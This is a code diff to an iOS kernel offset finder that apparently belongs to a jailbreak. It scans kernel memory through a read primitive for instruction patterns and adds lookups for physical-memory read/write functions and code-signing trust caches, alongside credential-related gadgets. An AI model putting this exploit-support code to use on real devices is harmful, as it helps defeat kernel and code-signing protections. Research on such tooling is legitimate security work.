@@ -162,7 +162,7 @@ static uint64_t search_proc_set_ucred_kread15(uint64_t vaddr, uint64_t size) {
     return 0;
 }
 
-static uint64_t search_search_add_x0_x0_0x40_kread(uint64_t vaddr, uint64_t size) {
+static uint64_t search_add_x0_x0_0x40_kread(uint64_t vaddr, uint64_t size) {
     vaddr += 0x20000;
     for(uint64_t i = 0; i < (size - 0x400000); i += 4)
     {
@@ -177,7 +177,7 @@ static uint64_t search_search_add_x0_x0_0x40_kread(uint64_t vaddr, uint64_t size
     return 0;
 }
 
-static uint64_t search_search_container_init_kread(uint64_t vaddr, uint64_t size) {
+static uint64_t search_container_init_kread(uint64_t vaddr, uint64_t size) {
     vaddr += 0x500000; // maybe
     
     //0x000140B2 [0x82408252] 0x8200A072 0x030080D2
@@ -193,7 +193,7 @@ static uint64_t search_search_container_init_kread(uint64_t vaddr, uint64_t size
     return 0;
 }
 
-static uint64_t search_search_iosurface_trapforindex_kread(uint64_t vaddr, uint64_t size) {
+static uint64_t search_iosurface_trapforindex_kread(uint64_t vaddr, uint64_t size) {
     vaddr += 0x500000; // maybe
     
     // 0xF44FBEA9 0xFD7B01A9 0xFD430091 0xF30301AA
@@ -212,6 +212,56 @@ static uint64_t search_search_iosurface_trapforindex_kread(uint64_t vaddr, uint6
                                 if(kread32_kfd(vaddr + i + 24) == 0xAA0203E1) { //
                                     if(kread32_kfd(vaddr + i + 28) == 0xD63F0100) { //
                                         return vaddr + i;
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+    return 0;
+}
+
+static uint64_t search_ml_phys_read_data_kread(uint64_t vaddr, uint64_t size) {
+    for(uint64_t i = 0; i < (size - 0x400000); i += 4) {
+        if(kread32_kfd(vaddr + i + 0) == 0xD10183FF) {
+            if(kread32_kfd(vaddr + i + 4) == 0xA9025FF8) {
+                if(kread32_kfd(vaddr + i + 8) == 0xA90357F6) {
+                    if(kread32_kfd(vaddr + i + 12) == 0xA9044FF4) {
+                        if(kread32_kfd(vaddr + i + 16) == 0xA9057BFD) {
+                            if(kread32_kfd(vaddr + i + 20) == 0x910143FD) {
+                                if(kread32_kfd(vaddr + i + 24) == 0xAA0003F4) {
+                                    if(kread32_kfd(vaddr + i + 28) == 0xD34EFC15) {
+                                        return vaddr + i;
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+    return 0;
+}
+
+static uint64_t search_ml_phys_write_data_kread(uint64_t vaddr, uint64_t size) {
+    for(uint64_t i = 0; i < (size - 0x400000); i += 4) {
+        if(kread32_kfd(vaddr + i + 0) == 0xD10183FF) {
+            if(kread32_kfd(vaddr + i + 4) == 0xA9025FF8) {
+                if(kread32_kfd(vaddr + i + 8) == 0xA90357F6) {
+                    if(kread32_kfd(vaddr + i + 12) == 0xA9044FF4) {
+                        if(kread32_kfd(vaddr + i + 16) == 0xA9057BFD) {
+                            if(kread32_kfd(vaddr + i + 20) == 0x910143FD) {
+                                if(kread32_kfd(vaddr + i + 24) == 0xAA0003F5) {
+                                    if(kread32_kfd(vaddr + i + 28) == 0xD34EFC16) {
+                                        if(kread32_kfd(vaddr + i + 32) == 0x8B224008) {
+                                            if(kread32_kfd(vaddr + i + 36) == 0xD1000508) {
+                                                return vaddr + i;
+                                            }
+                                        }
                                     }
                                 }
                             }
@@ -295,31 +345,35 @@ void offsetfinder64_kread(void)
     
     if(plk_text_exec_size)
     {
-        add_x0_x0_0x40 = search_search_add_x0_x0_0x40_kread(plk_text_exec_addr, plk_text_exec_size);
+        add_x0_x0_0x40 = search_add_x0_x0_0x40_kread(plk_text_exec_addr, plk_text_exec_size);
     }
     if(!add_x0_x0_0x40)
     {
-        add_x0_x0_0x40 = search_search_add_x0_x0_0x40_kread(text_exec_addr, text_exec_size);
+        add_x0_x0_0x40 = search_add_x0_x0_0x40_kread(text_exec_addr, text_exec_size);
     }
-    if(isAvailable() >= 8) {
+    if(isAvailable() >= 10) {
         proc_set_ucred = search_proc_set_ucred_kread16(text_exec_addr, text_exec_size);
-        container_init = search_search_container_init_kread(text_exec_addr, text_exec_size);
-        iogettargetand = search_search_iosurface_trapforindex_kread(text_exec_addr, text_exec_size);
+        container_init = search_container_init_kread(text_exec_addr, text_exec_size);
+        iogettargetand = search_iosurface_trapforindex_kread(text_exec_addr, text_exec_size);
         printf("container_init : %016llx\n", container_init);
         printf("iogettargetand : %016llx\n", iogettargetand);
-    } else if(isAvailable() >= 4) {
+    } else if(isAvailable() >= 6) {
         proc_set_ucred = search_proc_set_ucred_kread15(text_exec_addr, text_exec_size);
         printf("proc_set_ucred : %016llx\n", proc_set_ucred);
     }
     
     empty_kdata    = data_data_addr + 0x1600;
-    //empty_kdata     = 0xFFFFFFF007841000 + 0x200;
+    ml_phys_read   = search_ml_phys_read_data_kread(text_exec_addr, text_exec_size);
+    ml_phys_write  = search_ml_phys_write_data_kread(text_exec_addr, text_exec_size);
     
     printf("add_x0_x0_0x40 : %016llx\n", add_x0_x0_0x40);
     printf("empty_kdata    : %016llx\n", empty_kdata);
+    printf("ml_phys_read   : %016llx\n", ml_phys_read);
+    printf("ml_phys_write  : %016llx\n", ml_phys_write);
 }
 
 void Fugu15KPF(void) {
     objcbridge *obj = [[objcbridge alloc] init];
     mach_vm_alloc = [obj find_mach_vm_allocate];
+    trust_caches  = [obj find_pmap_image4_trust_caches];
 }
